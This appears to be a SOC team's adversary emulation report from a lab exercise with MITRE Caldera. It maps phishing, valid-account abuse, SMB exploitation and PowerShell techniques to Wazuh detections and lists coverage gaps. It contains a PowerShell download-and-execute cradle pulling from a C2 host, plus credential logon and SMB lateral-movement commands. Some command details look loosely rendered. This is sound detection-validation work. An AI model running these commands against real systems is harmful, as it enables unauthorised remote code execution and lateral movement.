# Adversary Emulation Report — MITRE Caldera
**Analyst:** SOC Analyst — cyart-soc-team
**Date:** 31 March 2026
**Tools:** MITRE Caldera v4, Wazuh, Elastic Security
**Attacker Simulation IP:** `10.0.2.20`
**Target:** Windows VM at `192.168.10.5`

---

## 1. Objective

Emulate adversary TTPs from MITRE ATT&CK to:
- Validate Wazuh detection rules for phishing, credential abuse, and remote exploitation
- Identify gaps in current detection coverage
- Improve SOC alerting accuracy for Week 4 capstone

---

## 2. Caldera Setup

### Agent Deployment
```bash
# Deploy Caldera agent (Sandcat) on target Windows VM
# In Caldera UI: Agents → Deploy Agent → Windows → Copy PowerShell command
powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:8888/file/download');
  $oper = Start-Caldera-Agent -server 'http://10.0.2.20:8888' -group 'soc-week4'"
```

### Profile
| Field         | Value                     |
|---------------|---------------------------|
| Adversary     | APT29 (Cozy Bear) Profile |
| Agent Name    | soc-agent-win01           |
| Platform      | Windows                   |
| C2 Server     | 10.0.2.20:8888            |
| Target Group  | soc-week4                 |

---

## 3. Emulation Operations

### Operation OP-001: T1566 — Phishing Simulation

**Objective:** Simulate a spearphishing email with a malicious attachment

**Steps Executed:**
1. Caldera sent a simulated phishing payload to the target VM
2. Payload executed a Base64-encoded PowerShell command
3. Simulated credential harvesting attempt

**Wazuh Detection Log:**

| Timestamp            | Source IP   | Target IP     | TTP    | Event Description              | Detection | Alert Level |
|----------------------|-------------|---------------|--------|--------------------------------|-----------|-------------|
| 2026-03-31 09:05:11  | 10.0.2.20   | 192.168.10.5  | T1566  | Phishing payload delivered     |  Yes    | High        |
| 2026-03-31 09:05:44  | 10.0.2.20   | 192.168.10.5  | T1566  | Encoded PS command executed    |  Yes    | High        |
| 2026-03-31 09:06:02  | 10.0.2.20   | 192.168.10.5  | T1566  | Outbound C2 callback attempt   |  Yes    | Critical    |

**Result:**  Fully Detected — 3/3 behaviors caught by Wazuh

---

### Operation OP-002: T1078 — Valid Accounts Abuse

**Objective:** Use stolen credentials to log in and enumerate privileges

**Steps Executed:**
```bash
# Caldera ability: use-valid-credentials
net use \\192.168.10.5\IPC$ /user:testuser "P@ssword123"
net localgroup administrators
whoami /priv
```

**Wazuh Detection Log:**

| Timestamp            | Source IP   | User       | Event ID | TTP    | Description                    | Detection |
|----------------------|-------------|------------|----------|--------|--------------------------------|-----------|
| 2026-03-31 09:12:33  | 10.0.2.20   | testuser   | 4624     | T1078  | Successful network logon        | Yes    |
| 2026-03-31 09:13:01  | 10.0.2.20   | testuser   | 4672     | T1078  | Privilege escalation detected   |  Yes    |
| 2026-03-31 09:13:22  | 10.0.2.20   | testuser   | 4688     | T1078  | whoami /priv executed           |  Yes    |

**Result:**  Fully Detected — 3/3 behaviors caught

---

### Operation OP-003: T1210 — Exploitation of Remote Services

**Objective:** Simulate exploitation of a vulnerable remote service (SMB)

**Steps Executed:**
```bash
# Caldera ability: lateral-movement-smb
# Attempt SMB exploitation (EternalBlue-style check)
smbclient \\\\192.168.10.5\\admin$ -U testuser%P@ssword123
```

**Wazuh Detection Log:**

| Timestamp            | Source IP   | Target IP    | Port | TTP    | Description                    | Detection     |
|----------------------|-------------|--------------|------|--------|--------------------------------|---------------|
| 2026-03-31 09:20:14  | 10.0.2.20   | 192.168.10.5 | 445  | T1210  | SMB lateral movement attempt   |  Yes        |
| 2026-03-31 09:20:41  | 10.0.2.20   | 192.168.10.5 | 445  | T1210  | Remote service exploitation     |  Partial   |
| 2026-03-31 09:21:10  | 10.0.2.20   | 192.168.10.5 | 445  | T1210  | Post-exploitation access        |  Missed     |

**Result:**  Partial Detection — 2/3 behaviors detected. Post-exploitation phase missed.

**Gap Identified:** Wazuh rule for post-exploitation SMB activity needs to be created.

---

### Operation OP-004: T1059 — Command & Scripting Interpreter

**Objective:** Test detection of PowerShell and cmd.exe abuse

**Steps Executed:**
```powershell
# Caldera ability: execute-powershell
powershell.exe -encodedCommand <base64_payload>
cmd.exe /c "systeminfo && ipconfig /all"
```

**Wazuh Detection Log:**

| Timestamp            | Source IP   | Process      | TTP    | Description                    | Detection |
|----------------------|-------------|--------------|--------|--------------------------------|-----------|
| 2026-03-31 09:30:08  | 10.0.2.20   | powershell   | T1059  | Encoded PS command detected    |  Yes    |
| 2026-03-31 09:30:22  | 10.0.2.20   | cmd.exe      | T1059  | System enumeration via cmd     |  Yes    |

**Result:**  Fully Detected — 2/2 behaviors caught

---

## 4. Detection Coverage Summary

| TTP    | Technique Name                    | Behaviors Tested | Detected | Missed | Coverage |
|--------|-----------------------------------|-----------------|----------|--------|----------|
| T1566  | Phishing                          | 3               | 3        | 0      | 100%     |
| T1078  | Valid Accounts                    | 3               | 3        | 0      | 100%     |
| T1210  | Exploitation of Remote Services   | 3               | 2        | 1      | 67%      |
| T1059  | Command & Scripting Interpreter   | 2               | 2        | 0      | 100%     |
| **Total** |                                | **11**          | **10**   | **1**  | **91%**  |

---

## 5. Detection Gaps & Recommendations

| Gap                                        | Impact | Recommendation                                 |
|--------------------------------------------|--------|------------------------------------------------|
| Post-exploitation SMB access not detected  | High   | Create Wazuh rule for SMB post-exploit pattern |
| T1210 post-exploitation = 0 coverage       | High   | Add Sysmon Event ID 3 + 8 rule mapping         |

---

## 6. Emulation Report Summary

The adversary emulation exercise on 31 March 2026 achieved 91% detection coverage across 11 simulated attack behaviors. Three techniques — T1566 (Phishing), T1078 (Valid Accounts), and T1059 (PowerShell) — achieved 100% detection in Wazuh, confirming strong existing rule coverage. One significant gap was identified in T1210 (Exploitation of Remote Services): post-exploitation SMB activity was not detected, indicating a missing Wazuh rule. This gap has been documented and a detection improvement ticket has been raised. Red-Blue collaboration from this exercise will directly improve SOC detection fidelity in the capstone and ongoing operations.

---

*Report Author: SOC Analyst | cyart-soc-team | 31 March 2026*
